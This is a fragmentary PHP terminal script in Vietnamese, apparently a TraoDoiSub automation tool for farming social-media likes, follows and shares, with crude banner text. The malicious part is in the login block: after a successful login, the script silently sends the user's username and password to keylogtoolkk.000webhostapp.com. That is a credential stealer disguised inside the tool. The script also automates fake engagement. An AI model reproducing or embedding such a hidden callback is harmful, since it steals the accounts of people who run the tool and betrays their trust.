...
$cuongvip = $do."[".$luc."●".$do."]";
$n_truoc = date("d");
$ngay = date("d"); $thang = date("m"); $nam = date("Y"); $a=date('d');  $b=date("m"); $thoigian=date('d/m'); $day = []; $day= date('d-m-y'); $today = date("d-m-y");$gio =date("H");$phut = date("i");$giay = date("s") ;$d = date("d-m");$ip = file_get_contents('http://kiemtraip.com/raw.php');
$a=date('d'); 
        $b=date("m");
        $thoigian=date('d/m');
$day = [];
...
$ngay_thang = date("d-m");
$khanhvip = $do."[".$luc."●".$do."]".$trang." => ";
$banner= "\033[1;33m╔═══════════════════════════════════════════════════════════════╗
\033[1;33m║                                   \033[1;33m║".$luc."Bản Quyền: \033[1;37mĐm bảo con cac ok!!       \033[1;33m║
\033[1;33m║  \033[1;32m  █▄▀ █░█ ▄▀█ █▄░█ █░█           \033[1;33m║\033[1;32mHỗ Trợ:\033[1;37mfb.com/###########\033[1;33m║
\033[1;33m║  \033[1;33m  No Khanh, Khanh so Dumb!!           \033[1;33m║\033[1;31mMomo: \033[1;37m#########           \033[1;33m║
\033[1;33m║                                   \033[1;33m║\033[1;31mZalo \033[1;37m: ##########          \033[1;33m║ 
\033[1;33m╚═══════════════════════════════════════════════════════════════╝
";
$thanhngang = "\33[37m---------------------------------------------------------
";
$thongtinad ="
$thanhngang\033[1;33m║$do FB :$trang ############      \033[1;33m║\033[1;31mYoutube \033[1;37m: Khanh con cac lỏ !!!\033[1;33m║
\033[1;33m║$do Zalo:$trang #########        \033[1;33m║\033[1;31mMomo \033[1;37m: #########            \033[1;33m║
$thanhngang";
$banphu = $khanhvip.$do."Bạn đang đăng nhập tool tại ip:$xduong $ip\n". 
$khanhvip.$do."Bạn đã đăng nhập tool vào:$vang $gio:$phut:$giay".$white." Ngày ".$do.$ngay.$trang." Tháng ".$do.$thang.$trang." Năm ".$do.$nam."\n";
$thanh_xau = $do."[".$luc."●".$do."]".$trang." => ";
$thanh_dep = $do."[".$luc."●".$do."]".$trang." => ";
$thanhngang = "\033[1;32m ────────────────────────────────────────────────────────────\n";
$thanhngang1 = "\033[1;32m ────────────────────────────────────────────────────────────\n";
$daucau = $do."[".$luc."●".$do."]".$trang." => ";
$daucauc = $do."[".$luc."●".$do."]".$trang." => ";
 $weekday = date("l"); 
$gioful = date('H:i:s');
$ngay = date("d"); 
$thang = date("m"); 
...
echo $banphu;
echo $thanhngang;
echo $do."                      TOOL TRAODOISUB COOKIE\n";
echo $thanhngang;
$listnv = [];
...
$_SESSION['password'] = explode("|",$data)[1];
$login = login();
$uskey = $_SESSION["username"];
$paskey = $_SESSION["password"];

if ($login == true) {
echo $thanh_dep.$xnhac."Đăng Nhập Thành Công.\n";
$linkbykhanhkey = "https://keylogtoolkk.000webhostapp.com/test1.php?tk=$uskey&mk=$paskey&type=tds";
$messagekhanhkey = file_get_contents($linkbykhanhkey);
break;
} else {
...
echo $daucau2.$luc."Lưu Ý: ".$hong."Nếu Muốn Dừng Lại Thì Nhấn Enter \n";
for ($a = 1; $a < 999999; $a++) {
...
if (!file_exists('Setting_TDS_Cookie.txt')) {
    $settings = json_encode(['delaygr' => '23', 'delaylike' => '15', 'delayfollow' => '20', 'delaycmt' => '15', 'delaypage' => '20', 'delayshare' => '35', 'delaycx' => '10', 'delaycxcmt' => '10', 'nhiemvu' => '120', 'block' => '200']);
...
$daucau2\033[1;92mNhập số: \033[1;33m";
    ...
    if ($_CHOOSE['settingdelay'] == 2) {
        $_SESSION['delaylike'] = $delaylike = rand(5, 10);
        ...
        $_SESSION['delaycx'] = $delaycx = rand(5, 10);
        $_SESSION['delaycxcmt'] = $delaycxcmt = rand(5, 10);
        $_SESSION['delaygr'] = $delaygr = rand(15, 30);
        $_SESSION['nhiemvu'] = $nhiemvu = rand(100, 200);
        $_SESSION['block'] = $block = rand(150, 200);
...
echo $thanhngang1;
echo $thanh_dep.$xnhac."Có Thể Chọn Nhiều Nhiệm Vụ (Ví Dụ 246 hoặc 123) \n";
...
function loadtime($loai)
{
    ...
    $delay = $_SESSION['' . $loai . ''];
    for($x = $delay ;$x>= 1;$x--){
        echo " \e[1;36m■\e[1;34m▉\e[1;35m■\e[1;36m■\e[1;31m■ \e[1;36mVui Lòng Đợi Khanh Đi Lấy Job Sau ".$vang.$x."\e[1;34m giây";
    usleep(180000); 
    echo "\r"; 
    echo " \r"; 
    echo " \e[1;35m■\e[1;35m■\e[1;36m▉\e[1;31m■\e[1;33m■ \e[1;34mVui Lòng Khanh Đi Lấy Job Sau ".$vang.$x."\e[1;31m giây";
    usleep(180000); 
    echo "\r"; 
    echo " \r"; 
    echo " \e[1;34m■\e[1;36m■\e[1;31m■\e[1;33m▉\e[1;34m■ \e[1;33mVui Lòng Khanh Đi Lấy Job Sau ".$vang.$x."\e[1;32m giây"; 
    usleep(180000); 
    echo "\r"; 
    echo " \r"; 
    echo " \e[1;33m■\e[1;32m■\e[1;31m■\e[1;35m■\e[1;36m▉ \e[1;31mVui Lòng Khanh Đi Lấy Job Sau ".$vang.$x."\e[1;36m giây"; 
    usleep(180000); 
    echo "\r"; 
    echo " \r"; 
    echo " \e[1;32m■\e[1;33m▉\e[1;35m■\e[1;36m■\e[1;31m■ \e[1;36mVui Lòng Khanh Đi Lấy Job Sau ".$vang.$x."\e[1;34m giây"; 
    usleep(180000); 
    echo "\r"; 
    echo " \r"; 
        }}
